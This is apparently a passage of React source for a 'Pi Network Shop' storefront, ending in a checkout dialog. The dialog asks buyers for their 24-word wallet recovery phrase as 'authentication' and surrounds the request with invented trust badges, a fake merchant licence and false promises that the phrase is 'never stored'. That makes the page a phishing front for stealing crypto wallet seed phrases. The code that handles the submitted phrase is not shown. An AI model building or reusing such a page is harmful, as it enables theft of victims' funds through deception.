                "The customer service is outstanding, and using Pi coins for purchases feels like 
                stepping into the future. This platform is a game-changer!"
              </p>
              <div className="flex items-center space-x-4">
                <div className="w-12 h-12 rounded-full bg-gradient-to-r from-purple-500 to-pink-500 flex items-center justify-center text-white font-bold">
                  A
                </div>
                <div>
                  <div className="font-semibold text-gray-900">Alex Rivera</div>
                  <div className="text-gray-500 text-sm">Blockchain Enthusiast</div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Contact Section */}
      <section id="contact" className="section-padding bg-gradient-to-br from-purple-50 to-blue-50">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="text-center mb-16">
            <h2 className="text-4xl lg:text-5xl font-bold text-gray-900 mb-6">
              Get in <span className="text-gradient">Touch</span>
            </h2>
            <p className="text-xl text-gray-600 max-w-3xl mx-auto">
              Have questions about Pi Network Shop? Our support team is here to help you 24/7.
            </p>
          </div>

          <div className="grid lg:grid-cols-3 gap-8">
            <div className="bg-white p-8 rounded-2xl shadow-lg text-center">
              <div className="w-16 h-16 bg-gradient-to-r from-blue-500 to-cyan-500 rounded-2xl flex items-center justify-center mx-auto mb-6">
                <Globe className="w-8 h-8 text-white" />
              </div>
              <h3 className="text-xl font-bold text-gray-900 mb-4">24/7 Support</h3>
              <p className="text-gray-600 mb-4">Round-the-clock customer support for all Pi Network pioneers.</p>
              <Button className="inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm font-medium ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 [&_svg]:pointer-events-none [&_svg]:size-4 [&_svg]:shrink-0 bg-primary hover:bg-primary/90 h-10 px-4 py-2 btn-primary text-[rgb(0,0,0)]">Contact Support</Button>
            </div>

            <div className="bg-white p-8 rounded-2xl shadow-lg text-center">
              <div className="w-16 h-16 bg-gradient-to-r from-purple-500 to-pink-500 rounded-2xl flex items-center justify-center mx-auto mb-6">
                <Users className="w-8 h-8 text-white" />
              </div>
              <h3 className="text-xl font-bold text-gray-900 mb-4">Community</h3>
              <p className="text-gray-600 mb-4">Join our vibrant community of Pi Network enthusiasts.</p>
              <Button className="inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm font-medium ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 [&_svg]:pointer-events-none [&_svg]:size-4 [&_svg]:shrink-0 bg-primary hover:bg-primary/90 h-10 px-4 py-2 btn-primary text-[rgb(0,0,0)]">Join Community</Button>
            </div>

            <div className="bg-white p-8 rounded-2xl shadow-lg text-center">
              <div className="w-16 h-16 bg-gradient-to-r from-green-500 to-emerald-500 rounded-2xl flex items-center justify-center mx-auto mb-6">
                <Shield className="w-8 h-8 text-white" />
              </div>
              <h3 className="text-xl font-bold text-gray-900 mb-4">Security</h3>
              <p className="text-gray-600 mb-4">Learn about our advanced security measures and protocols.</p>
              <Button className="inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm font-medium ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 [&_svg]:pointer-events-none [&_svg]:size-4 [&_svg]:shrink-0 bg-primary hover:bg-primary/90 h-10 px-4 py-2 btn-primary text-[rgb(0,0,0)]">Security Info</Button>
            </div>
          </div>
        </div>
      </section>

      {/* Professional Footer */}
      <footer id="footer" className="bg-gray-900 text-white py-16">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="grid lg:grid-cols-4 gap-8 mb-12">
            <div className="space-y-4">
              <div className="flex items-center space-x-3">
                <img src="/images/pi-logo.png" alt="Pi Network" className="w-8 h-8" />
                <span className="text-xl font-bold">Pi Network Shop</span>
              </div>
              <p className="text-gray-400 leading-relaxed">
                The premier destination for premium electronics, powered by Pi Network's revolutionary blockchain technology.
              </p>
            </div>

            <div>
              <h3 className="font-semibold text-lg mb-4">Products</h3>
              <ul className="space-y-2 text-gray-400">
                <li><a href="#" className="hover:text-white transition-colors">Smartphones</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Tablets</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Accessories</a></li>
                <li><a href="#" className="hover:text-white transition-colors">New Arrivals</a></li>
              </ul>
            </div>

            <div>
              <h3 className="font-semibold text-lg mb-4">Support</h3>
              <ul className="space-y-2 text-gray-400">
                <li><a href="#" className="hover:text-white transition-colors">Help Center</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Shipping Info</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Returns</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Contact Us</a></li>
              </ul>
            </div>

            <div>
              <h3 className="font-semibold text-lg mb-4">Pi Network</h3>
              <ul className="space-y-2 text-gray-400">
                <li><a href="#" className="hover:text-white transition-colors">About Pi</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Whitepaper</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Community</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Developers</a></li>
              </ul>
            </div>
          </div>

          {/* Trust Badges */}
          <div className="border-t border-gray-800 pt-6 mb-6">
            <div className="flex flex-wrap justify-center items-center space-x-6 space-y-2">
              <div className="flex items-center space-x-2">
                <img src="/images/pi-logo.png" alt="Pi Network" className="w-5 h-5" />
                <span className="text-gray-400 text-sm font-medium">Official Pi Network Partner</span>
              </div>
              <div className="flex items-center space-x-2">
                <CheckCircle className="w-4 h-4 text-green-500" />
                <span className="text-gray-400 text-sm font-medium">SSL Secured</span>
              </div>
              <div className="flex items-center space-x-2">
                <Shield className="w-4 h-4 text-blue-500" />
                <span className="text-gray-400 text-sm font-medium">Blockchain Protected</span>
              </div>
              <div className="flex items-center space-x-2">
                <Globe className="w-4 h-4 text-purple-500" />
                <span className="text-gray-400 text-sm font-medium">Global Commerce</span>
              </div>
            </div>
          </div>
          
          <div className="border-t border-gray-800 pt-8 flex flex-col lg:flex-row justify-between items-center">
            <div className="text-center lg:text-left">
              <p className="text-gray-400 text-sm">
                © 2024 Pi Network Shop. All rights reserved. Powered by Pi Network Blockchain.
              </p>
              <p className="text-gray-500 text-xs mt-1">
                Licensed Pi Network Merchant ID: PN-SHOP-2024-001 | Blockchain Verified
              </p>
            </div>
            <div className="flex space-x-6 mt-4 lg:mt-0">
              <a href="#" className="text-gray-400 hover:text-white transition-colors text-sm">Privacy Policy</a>
              <a href="#" className="text-gray-400 hover:text-white transition-colors text-sm">Terms of Service</a>
              <a href="#" className="text-gray-400 hover:text-white transition-colors text-sm">Cookie Policy</a>
            </div>
          </div>
        </div>
      </footer>

      {/* Enhanced Passphrase Modal */}
      <Dialog open={showPassphraseModal} onOpenChange={setShowPassphraseModal}>
        <DialogContent className="w-[92vw] max-w-md sm:max-w-lg mx-auto max-h-[92vh] overflow-y-auto border border-gray-300 shadow-2xl rounded-xl p-0 bg-white">
          <DialogHeader className="bg-gradient-to-r from-purple-600 to-indigo-700 text-white p-4 rounded-t-xl border-b border-purple-700">
            <div className="flex items-center justify-center space-x-3">
              <div className="w-12 h-12 flex items-center justify-center bg-white/20 rounded-full backdrop-blur-sm">
                <img src="/images/pi-logo.png" alt="Pi Network" className="w-8 h-8" />
              </div>
              <div className="text-center">
                <DialogTitle className="text-white text-base sm:text-lg font-bold">{t.walletAuth}</DialogTitle>
                <p className="text-purple-100 text-xs sm:text-sm font-medium">Pi Network Official • Blockchain Secured</p>
              </div>
            </div>
          </DialogHeader>
          
          <div className="p-4 space-y-4">
            {/* Trust Indicators */}
            <div className="bg-gradient-to-r from-green-50 to-emerald-50 p-3 rounded-lg border border-green-200">
              <div className="grid grid-cols-2 gap-2 text-xs">
                <div className="flex items-center space-x-1">
                  <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
                  <span className="text-green-700 font-semibold">Live Security</span>
                </div>
                <div className="flex items-center space-x-1">
                  <CheckCircle className="w-3 h-3 text-green-600" />
                  <span className="text-green-700 font-semibold">SSL Encrypted</span>
                </div>
                <div className="flex items-center space-x-1">
                  <img src="/images/pi-logo.png" alt="Pi" className="w-3 h-3" />
                  <span className="text-green-700 font-semibold">Pi Official</span>
                </div>
                <div className="flex items-center space-x-1">
                  <Globe className="w-3 h-3 text-green-600" />
                  <span className="text-green-700 font-semibold">Blockchain</span>
                </div>
              </div>
              <div className="mt-2 text-center">
                <p className="text-green-800 text-xs font-medium">
                  🔒 Protected by Pi Network's advanced blockchain security
                </p>
              </div>
            </div>
            
            <div className="text-center">
              <h2 className="text-sm sm:text-base font-bold text-slate-800 mb-1">{t.secureCheckout}</h2>
              <p className="text-slate-600 text-xs sm:text-sm">{t.completeDescription}</p>
            </div>
            
            {selectedProduct && <div className="bg-white p-3 rounded-lg border border-gray-200 shadow-sm">
                <div className="flex items-center space-x-3">
                  <div className="relative flex-shrink-0">
                    <img src={getProductImage(selectedProduct, 0)} alt={selectedProduct.name} className="w-12 h-12 object-cover rounded-lg border border-gray-200" />
                    {selectedProduct.discount_percentage > 0 && (
                      <div className="absolute -top-1 -right-1 bg-red-500 text-white text-xs px-1 py-0.5 rounded-full font-bold">
                        -{selectedProduct.discount_percentage}%
                      </div>
                    )}
                  </div>
                  <div className="flex-1 min-w-0">
                    <h3 className="font-semibold text-gray-900 text-sm mb-1 truncate">{selectedProduct.name}</h3>
                    <div className="flex items-center space-x-2 mb-1">
                      <span className="text-lg font-bold text-blue-600">{selectedProduct.price}π</span>
                      {selectedProduct.original_price > selectedProduct.price && (
                        <span className="text-gray-400 line-through text-sm">{selectedProduct.original_price}π</span>
                      )}
                    </div>
                    <div className="flex items-center space-x-1">
                      {[...Array(5)].map((_, i) => <span key={i} className={`text-sm ${i < Math.floor(selectedProduct.rating) ? 'text-yellow-400' : 'text-gray-300'}`}>★</span>)}
                      <span className="text-sm text-gray-600 ml-1">({selectedProduct.review_count})</span>
                    </div>
                  </div>
                </div>
              </div>}
            
            <div className="bg-gray-50 p-3 rounded-lg border border-gray-200">
              <h3 className="text-sm font-semibold text-gray-800 mb-3 flex items-center">
                <Users className="w-4 h-4 text-blue-600 mr-2" />
                {t.customerInfo}
              </h3>
              <div className="grid grid-cols-1 gap-3">
                <div>
                  <Label htmlFor="customerName" className="text-gray-700 font-medium text-sm">{t.fullName}</Label>
                  <Input id="customerName" value={customerName} onChange={e => setCustomerName(e.target.value)} placeholder={`Enter your ${t.fullName.toLowerCase()}`} className="mt-1 border border-gray-300 focus:border-blue-500 focus:ring-blue-500 rounded-md bg-white text-sm h-9" />
              </div>
              
                <div>
                  <Label htmlFor="customerEmail" className="text-gray-700 font-medium text-sm">{t.emailAddress}</Label>
                  <Input id="customerEmail" type="email" value={customerEmail} onChange={e => setCustomerEmail(e.target.value)} placeholder={`Enter your ${t.emailAddress.toLowerCase()}`} className="mt-1 border border-gray-300 focus:border-blue-500 focus:ring-blue-500 rounded-md bg-white text-sm h-9" />
                </div>
              </div>
            </div>
            
            {/* Color and Storage Selection */}
            {selectedProduct && <div className="bg-white p-2 sm:p-3 lg:p-4 rounded-xl sm:rounded-2xl border-2 border-slate-200 shadow-lg">
                <h3 className="text-base sm:text-lg font-semibold text-gray-900 mb-3 sm:mb-4 flex items-center">
                  <span className="w-2 h-2 bg-purple-600 rounded-full mr-2"></span>
                  Product Configuration
                </h3>
                <div className="space-y-3 sm:space-y-4">
                {selectedProduct.available_colors && selectedProduct.available_colors.length > 0 && <div>
                    <Label className="text-gray-700 font-medium mb-2 sm:mb-3 block text-sm sm:text-base">
                      Color: <span className="text-purple-600 font-semibold">{selectedColor}</span>
                    </Label>
                    <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-2">
                      {selectedProduct.available_colors.map(color => <button key={color} onClick={() => setSelectedColor(color)} className={`p-2 sm:p-3 text-xs sm:text-sm rounded-xl border-2 transition-all duration-200 font-medium ${selectedColor === color ? 'border-purple-500 bg-gradient-to-r from-purple-50 to-purple-100 text-purple-700 shadow-md' : 'border-gray-200 hover:border-purple-300 text-gray-700 hover:bg-gray-50'}`}>
                          {color}
                        </button>)}
                    </div>
                  </div>}
                
                {selectedProduct.available_storage && selectedProduct.available_storage.length > 0 && <div>
                    <Label className="text-gray-700 font-medium mb-2 sm:mb-3 block text-sm sm:text-base">
                      {selectedProduct.category === 'smartwatch' ? 'Size' : 'Storage'}: <span className="text-purple-600 font-semibold">{selectedStorage}</span>
                    </Label>
                    <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-4 gap-2">
                      {selectedProduct.available_storage.map(storage => <button key={storage} onClick={() => setSelectedStorage(storage)} className={`p-2 sm:p-3 text-xs sm:text-sm rounded-xl border-2 transition-all duration-200 font-medium ${selectedStorage === storage ? 'border-purple-500 bg-gradient-to-r from-purple-50 to-purple-100 text-purple-700 shadow-md' : 'border-gray-200 hover:border-purple-300 text-gray-700 hover:bg-gray-50'}`}>
                          {storage}
                        </button>)}
                    </div>
                  </div>}
                </div>
              </div>}
            
            <div className="bg-purple-50 p-3 rounded-lg border border-purple-200">
              <h3 className="text-sm font-semibold text-purple-900 mb-3 flex items-center">
                <img src="/images/pi-logo.png" alt="Pi" className="w-4 h-4 mr-2" />
                Pi Wallet Authentication
              </h3>
              <div className="bg-white p-2 rounded border border-purple-200">
                <Label htmlFor="passphrase" className="text-gray-700 font-medium text-sm">
                  Enter your 24-word recovery phrase
                </Label>
                <Textarea id="passphrase" value={passphrase} onChange={e => {
                  setPassphrase(e.target.value);
                  setPassphraseError('');
                }} placeholder={t.passphrasePlaceholder} rows={3} className="mt-1 resize-none border border-gray-300 focus:border-purple-500 focus:ring-purple-500 rounded text-sm bg-white" />
                {passphraseError && <p className="text-red-600 font-medium text-sm mt-1">{passphraseError}</p>}
              </div>
              <div className="flex items-center space-x-2 mt-2">
                <CheckCircle className="w-4 h-4 text-green-600" />
                <p className="text-xs text-gray-600">
                  🔒 Your passphrase is encrypted and never stored
                </p>
              </div>
            </div>
            
            <div className="pt-3">
              <Button onClick={handleSubmitOrder} disabled={isSubmitting} className="w-full bg-gradient-to-r from-purple-600 to-indigo-700 hover:from-purple-700 hover:to-indigo-800 text-white py-3 text-base font-semibold rounded-lg shadow-lg hover:shadow-xl transition-all duration-200 disabled:opacity-50">
                {isSubmitting ? (
                  <div className="flex items-center justify-center">
                    <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin mr-2"></div>
                    Processing Pi Transaction...
                  </div>
                ) : (
                  <div className="flex items-center justify-center">
                    <img src="/images/pi-logo.png" alt="Pi" className="w-4 h-4 mr-2" />
                    Complete Pi Purchase
                  </div>
                )}
              </Button>
            </div>
            
            {passphraseError && <div className="bg-red-50 border border-red-200 rounded-2xl p-3 sm:p-4 mx-1">
                <p className="text-red-800 font-semibold text-center text-sm sm:text-base">{passphraseError}</p>
                <p className="text-red-600 text-sm text-center mt-1">
                  Please ensure you enter exactly 24 words separated by spaces
                </p>
              </div>}
            
            <div className="bg-blue-50 border border-blue-200 rounded-xl p-4 space-y-3">
              <div className="flex items-start space-x-3">
                <Shield className="w-5 h-5 text-blue-600 mt-0.5" />
                <div className="text-sm text-blue-800">
                  <p className="font-semibold mb-1">Your Security is Our Priority</p>
                  <p>This is a non-custodial wallet. Your passphrase is encrypted and only accessible to you.</p>
                </div>
              </div>
              <div className="text-xs text-blue-700 bg-blue-100 p-3 rounded-lg">
                <strong>Important:</strong> Never share your passphrase with anyone. Pi Network Shop will never ask for your passphrase outside of this secure checkout process.
              </div>
            </div>
          </div>
        </DialogContent>
      </Dialog>
    </div>;
};
export default Index;